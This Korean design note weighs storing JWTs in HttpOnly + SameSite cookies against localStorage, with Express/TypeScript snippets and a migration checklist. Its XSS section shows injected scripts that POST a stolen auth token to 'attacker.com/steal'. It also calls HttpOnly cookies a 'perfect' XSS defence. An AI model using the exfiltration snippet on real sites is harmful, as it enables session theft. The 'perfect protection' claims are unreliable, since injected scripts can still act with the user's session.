# 백엔드 제안: HttpOnly + SameSite Cookie 분석

## 🎯 백엔드 팀 제안 사항

**제안**: JWT 토큰을 HttpOnly + SameSite Cookie로 저장

**이유**: XSS 공격으로부터 토큰을 완전히 보호하고, CSRF 공격도 SameSite 속성으로 방어

---

## 📊 심층 비교 분석

### 보안 측면

| 공격 유형 | localStorage | HttpOnly + SameSite Cookie | 승자 |
|----------|--------------|---------------------------|------|
| **XSS 공격** | ❌ 매우 취약 | ✅ 완벽 방어 | **Cookie** 🏆 |
| **CSRF 공격** | ✅ 안전 | ✅ 안전 (SameSite) | 무승부 |
| **중간자 공격** | ⚠️ HTTPS 필요 | ⚠️ HTTPS + Secure 필요 | 무승부 |

#### XSS 공격 시나리오 비교

**localStorage 방식 (현재)**:
```javascript
// 공격자가 악성 스크립트를 삽입하면
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('auth_token') // ❌ 토큰 탈취 가능
  });
</script>
```

**HttpOnly Cookie 방식 (제안)**:
```javascript
// 공격자가 악성 스크립트를 삽입해도
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie // ✅ HttpOnly 쿠키는 접근 불가
  });
  // 결과: "" (빈 문자열 또는 HttpOnly가 아닌 쿠키만 반환)
</script>
```

**결론**: Cookie가 XSS 공격에 대해 **완벽한 방어**를 제공합니다.

---

### 아키텍처 영향

#### 프론트엔드 변경사항

**localStorage 방식 (현재)**:
```typescript
// 명시적 토큰 관리
const token = localStorage.getItem('auth_token');
fetch('/api/boards', {
  headers: {
    'Authorization': `Bearer ${token}` // 수동으로 추가
  }
});
```

**HttpOnly Cookie 방식 (제안)**:
```typescript
// 자동 토큰 전송
fetch('/api/boards', {
  credentials: 'include' // 쿠키 자동 전송
});
// Authorization 헤더 불필요! 백엔드가 쿠키에서 토큰 추출
```

**프론트엔드 코드 간소화**:
- ✅ Authorization 헤더 수동 추가 불필요
- ✅ 토큰 저장/조회 로직 제거
- ✅ apiClient.ts의 토큰 관리 로직 대폭 간소화

---

#### 백엔드 변경사항

**현재 방식 (Authorization 헤더)**:
```javascript
// 백엔드 미들웨어
app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (token) {
    req.user = jwt.verify(token, SECRET);
  }
  next();
});
```

**제안 방식 (HttpOnly Cookie)**:
```javascript
// 로그인 시 쿠키 설정
res.cookie('auth_token', jwtToken, {
  httpOnly: true,      // ✅ JavaScript 접근 불가
  secure: true,        // ✅ HTTPS에서만 전송
  sameSite: 'strict',  // ✅ CSRF 방어
  maxAge: 24 * 60 * 60 * 1000 // 24시간
});

// 백엔드 미들웨어
app.use((req, res, next) => {
  const token = req.cookies.auth_token; // 쿠키에서 자동 추출
  if (token) {
    req.user = jwt.verify(token, SECRET);
  }
  next();
});
```

**백엔드 책임 증가**:
- ✅ 쿠키 설정 및 관리
- ✅ CORS credentials 처리
- ✅ SameSite 정책 관리

---

### CORS 처리

#### localStorage 방식 (현재)
```javascript
// 백엔드 CORS 설정 (간단)
app.use(cors({
  origin: 'http://localhost:5173'
}));
```

#### HttpOnly Cookie 방식 (제안)
```javascript
// 백엔드 CORS 설정 (복잡)
app.use(cors({
  origin: 'http://localhost:5173',
  credentials: true,  // ⚠️ 쿠키 전송 허용 필수
  allowedHeaders: ['Content-Type']
}));
```

```typescript
// 프론트엔드 모든 요청에 추가
fetch('/api/boards', {
  credentials: 'include' // ⚠️ 모든 요청마다 필요
});
```

**주의사항**:
- ⚠️ CORS credentials 설정 실수 시 쿠키 전송 안됨
- ⚠️ 프론트엔드 모든 fetch 요청에 `credentials: 'include'` 필수

---

### 개발 편의성

| 항목 | localStorage | HttpOnly Cookie | 승자 |
|-----|--------------|-----------------|------|
| **디버깅** | ✅ 쉬움 (개발자 도구) | ❌ 어려움 (보이지 않음) | localStorage |
| **테스트** | ✅ 쉬움 (직접 조작) | ❌ 어려움 (서버 설정 필요) | localStorage |
| **로컬 개발** | ✅ 간단 | ⚠️ HTTPS 설정 권장 | localStorage |
| **Postman 테스트** | ✅ 쉬움 (헤더 추가) | ⚠️ 쿠키 관리 필요 | localStorage |

**개발 경험 예시**:

**localStorage**:
```javascript
// 개발자 도구에서 즉시 확인
localStorage.getItem('auth_token') // "eyJhbGc..."

// 테스트 시 쉽게 조작
localStorage.setItem('auth_token', 'test-token');
```

**HttpOnly Cookie**:
```javascript
// 개발자 도구에서 볼 수 없음
document.cookie // "" (HttpOnly 쿠키는 보이지 않음)

// Application 탭 → Cookies에서만 확인 가능 (값은 볼 수 있지만 조작 불가)
// 테스트 시 백엔드 API 호출해야 함
```

---

### 모바일 앱 호환성

| 플랫폼 | localStorage | HttpOnly Cookie | 비고 |
|-------|--------------|-----------------|------|
| **React Native** | ✅ AsyncStorage | ⚠️ 제한적 | Cookie 지원 약함 |
| **Electron** | ✅ 완벽 지원 | ✅ 완벽 지원 | 둘 다 가능 |
| **PWA** | ✅ 완벽 지원 | ✅ 완벽 지원 | 둘 다 가능 |
| **Cordova** | ✅ 완벽 지원 | ⚠️ 제한적 | Cookie 지원 약함 |

**향후 확장성**:
- localStorage: 모바일 앱 전환 시 동일한 로직 사용 가능
- HttpOnly Cookie: 모바일 앱 전환 시 인증 로직 재작성 필요

---

## 🔄 프론트엔드 코드 변경 비교

### 현재 구현 (localStorage + Authorization 헤더)

```typescript
// apiClient.ts
class ApiClient {
  private async request<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
    const token = getToken(); // localStorage에서 가져오기

    const config: RequestInit = {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...(token && { 'Authorization': `Bearer ${token}` }), // 수동 추가
        ...options.headers,
      },
    };

    const response = await fetch(`${this.baseURL}${endpoint}`, config);
    // ... 에러 처리
  }
}
```

### HttpOnly Cookie 방식으로 변경 시

```typescript
// apiClient.ts (간소화)
class ApiClient {
  private async request<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
    // 토큰 관리 로직 제거! ✨

    const config: RequestInit = {
      ...options,
      credentials: 'include', // 쿠키 자동 전송
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
    };

    const response = await fetch(`${this.baseURL}${endpoint}`, config);
    // ... 에러 처리
  }
}
```

**변경사항**:
- ✅ `getToken()` 호출 제거
- ✅ Authorization 헤더 관리 제거
- ✅ `credentials: 'include'` 추가만 하면 끝

---

### 로그인/회원가입 응답 처리

**현재 (localStorage)**:
```typescript
// ParticipantLogin.ts
const { token, user, boards } = await api.login(userId);

setToken(token);          // localStorage 저장
setUserId(user.userId);
setAuthUser(user);
setMyBoards(boards.boards);
```

**HttpOnly Cookie 방식**:
```typescript
// ParticipantLogin.ts (간소화)
const { user, boards } = await api.login(userId);

// token 저장 로직 제거! 백엔드가 자동으로 쿠키 설정
setUserId(user.userId);
setAuthUser(user);
setMyBoards(boards.boards);
```

**백엔드 응답**:
```javascript
// 백엔드 (현재)
res.json({
  token: jwtToken,  // ❌ 프론트엔드로 전송 (보안 위험)
  user: { ... },
  boards: { ... }
});

// 백엔드 (제안)
res.cookie('auth_token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
res.json({
  // token 필드 제거! ✨
  user: { ... },
  boards: { ... }
});
```

---

### 로그아웃 처리

**현재 (localStorage)**:
```typescript
// 프론트엔드에서 처리
function logout() {
  clearAuth(); // localStorage.removeItem('auth_token')
  navigateTo('/');
}
```

**HttpOnly Cookie 방식**:
```typescript
// 백엔드 API 호출 필요
async function logout() {
  await apiClient.post('/auth/logout'); // 백엔드가 쿠키 삭제
  clearAuth(); // user, boards만 삭제
  navigateTo('/');
}
```

**백엔드 로그아웃 엔드포인트**:
```javascript
app.post('/auth/logout', (req, res) => {
  res.clearCookie('auth_token');
  res.json({ message: 'Logged out successfully' });
});
```

---

## 🎯 최종 권장사항

### 상황 1: 보안이 최우선 (추천 ⭐)

**선택**: **HttpOnly + SameSite Cookie**

**이유**:
1. ✅ **XSS 완벽 방어** - 가장 중요한 보안 위협 차단
2. ✅ **CSRF 자동 방어** - SameSite=Strict로 완벽 보호
3. ✅ **프론트엔드 코드 간소화** - 토큰 관리 로직 제거
4. ✅ **산업 표준** - 대부분의 보안 전문가 권장

**단점 수용**:
- ⚠️ 디버깅 약간 불편 (큰 문제 아님)
- ⚠️ CORS 설정 복잡 (한 번만 설정)
- ⚠️ 모바일 앱 확장 시 재작성 필요 (향후 문제)

**적용 조건**:
- 백엔드 팀이 쿠키 관리 책임을 질 수 있음
- HTTPS 환경 구축 가능
- CORS credentials 처리 가능

---

### 상황 2: 개발 편의성 우선

**선택**: **localStorage + Authorization 헤더** (현재 구현)

**이유**:
1. ✅ 디버깅 쉬움
2. ✅ 테스트 편리
3. ✅ 모바일 앱 확장 용이
4. ✅ CORS 설정 간단

**보안 강화 필수**:
- ⚠️ Content Security Policy 설정
- ⚠️ Input Sanitization 철저
- ⚠️ XSS 방어 메커니즘 구현

**적용 조건**:
- XSS 방어를 프론트엔드에서 책임질 수 있음
- CSP 등 보안 조치 적용 가능
- 향후 모바일 앱 확장 계획 있음

---

## 💡 나의 최종 의견

### HttpOnly + SameSite Cookie 방식을 강력 추천합니다! 🏆

**근거**:

1. **보안이 가장 중요합니다**
   - XSS는 웹 애플리케이션의 가장 흔한 공격
   - localStorage는 XSS에 100% 노출됨
   - HttpOnly Cookie는 XSS로부터 완벽 보호

2. **백엔드가 제안했다는 것은**
   - 백엔드 팀이 쿠키 관리 책임을 질 준비가 됨
   - CORS, SameSite 설정을 정확히 할 수 있음
   - 로그아웃 API 등 추가 엔드포인트 구현 가능

3. **프론트엔드 코드가 오히려 간소화됨**
   - 토큰 관리 로직 제거
   - Authorization 헤더 관리 불필요
   - `credentials: 'include'`만 추가

4. **개발 불편함은 일시적**
   - 디버깅 어려움: Application 탭에서 확인 가능
   - CORS 설정: 초기 한 번만 설정
   - 모바일 앱: 향후 계획이 불확실함

---

## 🔄 전환 작업 예상 범위

### 프론트엔드 작업

**파일 수정**:
1. `src/utils/apiClient.ts`
   - `getToken()` 호출 제거
   - Authorization 헤더 제거
   - `credentials: 'include'` 추가

2. `src/utils/cookies.ts`
   - `setToken()`, `getToken()`, `clearToken()` 제거
   - 또는 빈 함수로 유지 (호환성)

3. `src/components/ParticipantLogin.ts`
   - 응답에서 token 필드 제거
   - `setToken(token)` 호출 제거

4. `src/components/UserRegistration.ts`
   - 응답에서 token 필드 제거
   - `setToken(token)` 호출 제거

**추가 작업**:
- 로그아웃 API 호출 구현
- 모든 fetch 요청에 `credentials: 'include'` 추가 확인

**예상 작업 시간**: 2-3시간

---

### 백엔드 작업

**필수 구현**:
1. 로그인/회원가입 응답에서 쿠키 설정
2. CORS credentials 설정
3. 로그아웃 엔드포인트 구현
4. SameSite, Secure, HttpOnly 속성 설정

**예상 작업 시간**: 1-2시간

---

## 📋 전환 체크리스트

### 백엔드 작업
- [ ] 로그인 API에서 HttpOnly 쿠키 설정
- [ ] 회원가입 API에서 HttpOnly 쿠키 설정
- [ ] 로그아웃 API 구현 (쿠키 삭제)
- [ ] CORS credentials: true 설정
- [ ] SameSite=Strict 설정
- [ ] Secure flag 설정 (프로덕션)

### 프론트엔드 작업
- [ ] apiClient.ts 수정 (credentials: 'include')
- [ ] ParticipantLogin.ts 수정 (token 저장 제거)
- [ ] UserRegistration.ts 수정 (token 저장 제거)
- [ ] 로그아웃 API 호출 구현
- [ ] cookies.ts 정리 (token 관련 함수 제거)

### 테스트
- [ ] 로그인 → 쿠키 설정 확인
- [ ] 회원가입 → 쿠키 설정 확인
- [ ] API 요청 → 쿠키 자동 전송 확인
- [ ] 로그아웃 → 쿠키 삭제 확인
- [ ] CORS 테스트

---

## 🎓 학습 자료

### HttpOnly Cookie 베스트 프랙티스
- [OWASP - HttpOnly](https://owasp.org/www-community/HttpOnly)
- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)

### SameSite 속성
- [web.dev - SameSite cookies](https://web.dev/samesite-cookies-explained/)
- [RFC 6265 - HTTP State Management](https://datatracker.ietf.org/doc/html/rfc6265)

---

## 🚀 최종 결론

백엔드 팀의 **HttpOnly + SameSite Cookie** 제안을 **강력히 지지합니다**.

보안이 가장 중요하며, 프론트엔드 코드도 오히려 간소화되고, 백엔드가 책임을 지겠다고 하니 최고의 선택입니다.

**권장**: HttpOnly Cookie 방식으로 전환하되, 전환 과정에서 백엔드 팀과 긴밀히 협력하여 CORS 설정 등을 정확히 맞추는 것이 중요합니다.
